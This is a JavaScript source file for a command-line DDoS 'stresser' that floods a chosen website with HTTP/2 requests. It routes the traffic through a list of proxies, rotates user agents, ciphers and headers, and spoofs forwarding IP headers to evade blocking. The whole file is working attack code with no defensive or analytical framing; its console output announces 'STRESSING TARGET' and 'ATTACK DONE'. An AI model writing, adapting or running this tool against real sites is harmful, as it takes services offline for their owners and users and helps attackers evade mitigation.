const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const path = require("path");
const crypto = require("crypto");
const fs = require("fs");
const axios = require("axios");
const https = require("https");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});

if (process.argv.length < 7) {
    console.log(`node pl.js <target> <duration> <RPS> <threads> <proxyfile>`);
    process.exit();
}

// Fungsi untuk baca file txt ke array (tanpa baris kosong)
function readArrayFromFile(filename) {
    return fs.readFileSync(path.join(__dirname, filename), 'utf-8')
        .split(/\r?\n/)
        .map(l => l.trim())
        .filter(Boolean);
}

// Load array dari file txt
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const proxies = readArrayFromFile(args.proxyFile);
const referers = readArrayFromFile('referers.txt');
const userAgents = readArrayFromFile('useragents.txt');
const cplist = readArrayFromFile('ciphers.txt');
const sigalgs = readArrayFromFile('sigalgs.txt');
const pathts = readArrayFromFile('pathts.txt');
const lang_header = readArrayFromFile('lang_header.txt');
const accept_header = readArrayFromFile('accept_header.txt');
const encoding_header = readArrayFromFile('encoding_header.txt');
const controle_header = readArrayFromFile('controle_header.txt');

const Methods = ["COPY", "DELETE", "GET", "HEAD", "LINK", "LOCK", "MOVE", "PATCH", "POST", "PUT"];
const queryStrings = ["&", "="];

function getCurrentTime() {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
}
function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}
function randomString(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    return result;
}
function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}
function ip_spoof() {
    const ip_segment = () => Math.floor(Math.random() * 255);
    return `${ip_segment()}.${ip_segment()}.${ip_segment()}.${ip_segment()}`;
}

// Status check
const targetURL = args.target;
const agent = new https.Agent({ rejectUnauthorized: false });
function getTitleFromHTML(html) {
    const match = html.match(/<title>(.*?)<\/title>/i);
    return match && match[1] ? match[1] : 'Not Found';
}
function getStatus() {
    const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Request timed out')), 5000));
    const axiosPromise = axios.get(targetURL, { httpsAgent: agent });
    Promise.race([axiosPromise, timeoutPromise])
        .then((response) => {
            const { status, data } = response;
            console.log(`[\x1b[34mlucu\x1b[0m] ${getCurrentTime()} TITLE: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
        })
        .catch((error) => {
            if (error.message === 'Request timed out') {
                console.log(`[\x1b[34mlucu\x1b[0m] ${getCurrentTime()} Request Timed Out`);
            } else if (error.response) {
                const extractedTitle = getTitleFromHTML(error.response.data);
                console.log(`[\x1b[34mlucu\x1b[0m] ${getCurrentTime()} TITLE: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
            } else {
                console.log(`[\x1b[34mlucu\x1b[0m] ${getCurrentTime()} ${error.message}`);
            }
        });
}

// Master process
if (cluster.isMaster) {
    console.clear();
    console.log('\x1b[36m%s\x1b[0m', 'DDOS STRESSER');
    console.log('\x1b[36m%s\x1b[0m', 'STRESSING TARGET');
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
        console.log(`[\x1b[32mCODE\x1b[0m] ${getCurrentTime()} Thread ${i + 1} started`);
    }
    setInterval(getStatus, 2000);
    setTimeout(() => {
        console.log(`[\x1b[34mSERVER\x1b[0m] ${getCurrentTime()} ATTACK DONE`);
        process.exit(1);
    }, args.time * 1000);
} else {
    setInterval(runFlooder, 1000);
}

class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({ host: options.host, port: options.port });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => connection.write(buffer));
        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });
        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}
const Socker = new NetSocket();

function buildHeaders(fakeIP, randomReferer, randomUA) {
    const parsedTarget = url.parse(args.target);
    return {
        ":method": randomElement(Methods),
        ":path": parsedTarget.path + randomElement(pathts) + "&" + randomString(8) + randomElement(queryStrings) + randomString(8),
        "origin": parsedTarget.host,
        "accept": randomElement(accept_header),
        "accept-language": randomElement(lang_header),
        "accept-encoding": randomElement(encoding_header),
        "cache-control": randomElement(controle_header),
        "DNT": "1",
        "connection": "keep-alive",
        "user-agent": randomUA,
        "x-forwarded-for": fakeIP,
        "x-forwarded-host": fakeIP,
        "client-ip": fakeIP,
        "real-ip": fakeIP,
        "referer": randomReferer
        // Tambahkan header lain sesuai header random di kode asli!
    };
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const [proxyHost, proxyPort] = proxyAddr.split(":");
    const fakeIP = ip_spoof();
    const randomReferer = randomElement(referers);
    const randomUA = randomElement(userAgents);
    const headers = buildHeaders(fakeIP, randomReferer, randomUA);
    const parsedTarget = url.parse(args.target);

    const proxyOptions = {
        host: proxyHost,
        port: ~~proxyPort,
        address: parsedTarget.host,
        timeout: 25
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 900000);

        const tlsOptions = {
            ALPNProtocols: ['http/1.1', 'h2'],
            ciphers: randomElement(cplist),
            secureProtocol: "TLS_method",
            servername: parsedTarget.host,
            socket: connection,
            honorCipherOrder: true,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET |
                crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3,
            rejectUnauthorized: false,
            port: 443
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 64000,
            createConnection: () => tlsConn,
            socket: connection
        });

        client.on("connect", () => {
            for (let i = 0; i < args.Rate; i++) {
                const request = client.request(headers);
                request.on("response", () => {
                    request.close();
                    request.destroy();
                });
                request.end();
            }
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
        });
    });

    setTimeout(() => {
        process.exit(1);
    }, args.time * 1000);
}